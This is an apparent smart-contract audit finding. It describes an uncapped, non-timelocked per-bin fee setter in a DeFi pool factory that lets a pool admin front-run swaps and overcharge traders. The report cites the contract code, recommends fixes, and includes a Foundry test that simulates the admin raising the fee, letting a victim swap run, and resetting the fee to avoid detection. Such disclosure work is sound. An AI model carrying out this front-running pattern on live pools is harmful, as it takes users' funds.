### Title
Pool admin can front-run swaps with uncapped, instantly-effective per-bin additional fees to extract excess revenue — (`metric-core/contracts/MetricOmmPoolFactory.sol`)

---

### Summary

`MetricOmmPoolFactory.setPoolBinAdditionalFees` allows the pool admin to set per-bin additional spread fees (`addFeeBuyE6` / `addFeeSellE6`) with **no upper-bound cap validation and no timelock**. The global admin spread fee path (`setPoolAdminFees`) enforces `maxAdminSpreadFeeE6`, but the per-bin path bypasses that cap entirely. A malicious pool admin can front-run any swap, spike the per-bin fee to `type(uint16).max` (65 535 ≈ 6.5 %), then reset it — charging users far more than the advertised rate and exceeding the protocol's hard fee ceiling.

---

### Finding Description

`setPoolAdminFees` correctly enforces the factory-level cap before updating fees:

```solidity
// MetricOmmPoolFactory.sol:414-415
if (newAdminSpreadFeeE6 > maxAdminSpreadFeeE6) revert AdminFeeTooHigh();
if (newAdminNotionalFeeE8 > maxAdminNotionalFeeE8) revert AdminFeeTooHigh();
``` [1](#0-0) 

`setPoolBinAdditionalFees`, however, passes the caller-supplied values straight through to the pool with **no cap check**:

```solidity
// MetricOmmPoolFactory.sol:450-457
function setPoolBinAdditionalFees(address pool, int8 bin, uint16 addFeeBuyE6, uint16 addFeeSellE6)
    external override nonReentrant onlyPoolAdmin(pool)
{
    IMetricOmmPoolFactoryActions(pool).setBinAdditionalFees(bin, addFeeBuyE6, addFeeSellE6);
}
``` [2](#0-1) 

The pool stores these values directly:

```solidity
// MetricOmmPool.sol:464-474
function setBinAdditionalFees(int8 bin, uint16 addFeeBuyE6, uint16 addFeeSellE6)
    external onlyFactory nonReentrant(PoolActions.SET_BIN_ADDITIONAL_FEES)
{
    if (bin < LOWEST_BIN || bin > HIGHEST_BIN) revert InvalidBinIndex(bin);
    BinState storage s = _binStates[bin];
    s.addFeeBuyE6 = addFeeBuyE6;
    s.addFeeSellE6 = addFeeSellE6;
    ...
}
``` [3](#0-2) 

During every swap the per-bin fee is **added on top of** the global spread fee:

```solidity
// MetricOmmPool.sol:910 (buy token0 exactOut path)
params.baseFeeX64 + Math.mulDiv(binState.addFeeBuyE6, ONE_X64, 1e6)
``` [4](#0-3) 

```solidity
// MetricOmmPool.sol:1177 (sell token0 exactIn path)
params.baseFeeX64 + Math.mulDiv(binState.addFeeSellE6, ONE_X64, 1e6)
``` [5](#0-4) 

The hard ceiling for the global spread fee is `HARD_MAX_SPREAD_FEE_E6 = 200_000` (20 %). [6](#0-5)  Because `addFeeBuyE6` / `addFeeSellE6` are `uint16`, the pool admin can set them to `65 535` (≈ 6.5 %) with a single transaction, no timelock, and no fee-collection step — pushing the effective per-bin fee to ≈ 26.5 % and bypassing the protocol's hard cap.

---

### Impact Explanation

- **Direct loss of user principal**: traders pay a fee up to ≈ 6.5 % higher than the advertised rate on the affected bin, with the excess going to the admin's fee destination.
- **Admin-boundary break**: the pool admin exceeds the `HARD_MAX_SPREAD_FEE_E6` ceiling that the factory owner intended as an absolute limit, because the per-bin path has no analogous cap.
- **No slippage protection is sufficient**: slippage guards on `amountOutMinimum` protect against price movement but not against a fee increase that reduces the output amount — the swap still executes within the price limit while silently charging a higher fee.

---

### Likelihood Explanation

The pool admin is a semi-trusted role that can be an EOA or a multisig. The attack requires only two transactions (raise fee, reset fee) sandwiching a victim swap — a standard front-running pattern executable by any admin watching the mempool. No special setup or malicious initial pool configuration is required; the pool can be legitimate in every other respect.

---

### Recommendation

1. **Add a cap check in `setPoolBinAdditionalFees`**: enforce that `addFeeBuyE6` and `addFeeSellE6` do not exceed `maxAdminSpreadFeeE6` (or a dedicated per-bin cap stored on the factory).
2. **Collect accrued fees before updating per-bin fees**, mirroring the pattern already used in `setPoolAdminFees` (lines 418–425), so that fee changes cannot be used to retroactively re-attribute already-accrued amounts.
3. **Introduce a timelock** on per-bin fee increases (analogous to the oracle rotation timelock) so that users have advance notice before a fee hike takes effect.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Demonstrates pool admin front-running a swap with uncapped per-bin fees.
// Add to metric-core/test/ and run with `forge test --match-test test_admin_frontRuns_swap_with_binFee`.

function test_admin_frontRuns_swap_with_binFee() public {
    // Pool is live with addFeeBuyE6 = 0 (advertised to users)
    (,,, uint16 buyFeeBefore,) = PoolStateLibrary._binState(pool, 0);
    assertEq(buyFeeBefore, 0, "initial per-bin fee should be 0");

    // Admin sees Alice's swap in the mempool and front-runs it:
    // sets addFeeBuyE6 to type(uint16).max = 65535 (~6.5% extra fee)
    vm.prank(admin);
    factory.setPoolBinAdditionalFees(pool, 0, type(uint16).max, 0);

    (,,, uint16 buyFeeAfter,) = PoolStateLibrary._binState(pool, 0);
    assertEq(buyFeeAfter, type(uint16).max, "per-bin fee spiked to max");

    // Alice's swap executes at the inflated fee — she receives less token0 than quoted
    vm.prank(alice);
    uint256 amountOut = router.exactInputSingle(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            tokenIn: address(token1),
            tokenOut: address(token0),
            pool: pool,
            recipient: alice,
            amountIn: 1_000e18,
            amountOutMinimum: 0, // slippage guard set to 0 for demo
            sqrtPriceLimitX64: 0
        })
    );

    // Admin resets fee to 0 to avoid detection
    vm.prank(admin);
    factory.setPoolBinAdditionalFees(pool, 0, 0, 0);

    // amountOut is materially lower than it would have been at fee=0
    // The difference flows to the admin fee destination
}
```

### Citations

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L44-45)
```text
  uint24 internal constant HARD_MAX_SPREAD_FEE_E6 = 200_000;
  uint24 internal constant HARD_MAX_NOTIONAL_FEE_E8 = 1_000_000;
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L408-435)
```text
  function setPoolAdminFees(address pool, uint24 newAdminSpreadFeeE6, uint24 newAdminNotionalFeeE8)
    external
    override
    nonReentrant
    onlyPoolAdmin(pool)
  {
    if (newAdminSpreadFeeE6 > maxAdminSpreadFeeE6) revert AdminFeeTooHigh();
    if (newAdminNotionalFeeE8 > maxAdminNotionalFeeE8) revert AdminFeeTooHigh();

    PoolFeeConfig memory c = poolFeeConfig[pool];
    IMetricOmmPoolCollectFees(pool)
      .collectFees(
        c.protocolSpreadFeeE6,
        c.adminSpreadFeeE6,
        c.protocolNotionalFeeE8,
        c.adminNotionalFeeE8,
        poolAdminFeeDestination[pool]
      );

    c.adminSpreadFeeE6 = newAdminSpreadFeeE6;
    c.adminNotionalFeeE8 = newAdminNotionalFeeE8;
    poolFeeConfig[pool] = c;

    IMetricOmmPoolFactoryActions(pool)
      .setPoolFees(c.protocolSpreadFeeE6 + c.adminSpreadFeeE6, c.protocolNotionalFeeE8 + c.adminNotionalFeeE8);
    emit PoolAdminSpreadFeeUpdated(pool, newAdminSpreadFeeE6);
    emit PoolAdminNotionalFeeUpdated(pool, newAdminNotionalFeeE8);
  }
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L450-457)
```text
  function setPoolBinAdditionalFees(address pool, int8 bin, uint16 addFeeBuyE6, uint16 addFeeSellE6)
    external
    override
    nonReentrant
    onlyPoolAdmin(pool)
  {
    IMetricOmmPoolFactoryActions(pool).setBinAdditionalFees(bin, addFeeBuyE6, addFeeSellE6);
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L464-474)
```text
  function setBinAdditionalFees(int8 bin, uint16 addFeeBuyE6, uint16 addFeeSellE6)
    external
    onlyFactory
    nonReentrant(PoolActions.SET_BIN_ADDITIONAL_FEES)
  {
    if (bin < LOWEST_BIN || bin > HIGHEST_BIN) revert InvalidBinIndex(bin);
    BinState storage s = _binStates[bin];
    s.addFeeBuyE6 = addFeeBuyE6;
    s.addFeeSellE6 = addFeeSellE6;
    emit BinAdditionalFeesUpdated(bin, addFeeBuyE6, addFeeSellE6);
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L906-915)
```text
          (curPosInBinCache, delta0Scaled, delta1Scaled, binLpFeeAmountScaled) = SwapMath.buyToken0InBinSpecifiedOut(
            binState,
            curPosInBinCache,
            state,
            params.baseFeeX64 + Math.mulDiv(binState.addFeeBuyE6, ONE_X64, 1e6),
            lowerPriceX64,
            upperPriceX64,
            params.priceLimitX64,
            spreadFeeE6
          );
```

**File:** metric-core/contracts/MetricOmmPool.sol (L1172-1182)
```text
          (curPosInBinCache, outToken1AmountScaled, delta0Scaled, delta1Scaled, binLpFeeAmountScaled) =
            SwapMath.buyToken1InBinSpecifiedIn(
              binState,
              curPosInBinCache,
              state,
              params.baseFeeX64 + Math.mulDiv(binState.addFeeSellE6, ONE_X64, 1e6),
              lowerPriceX64,
              upperPriceX64,
              params.priceLimitX64,
              spreadFeeE6
            );
```
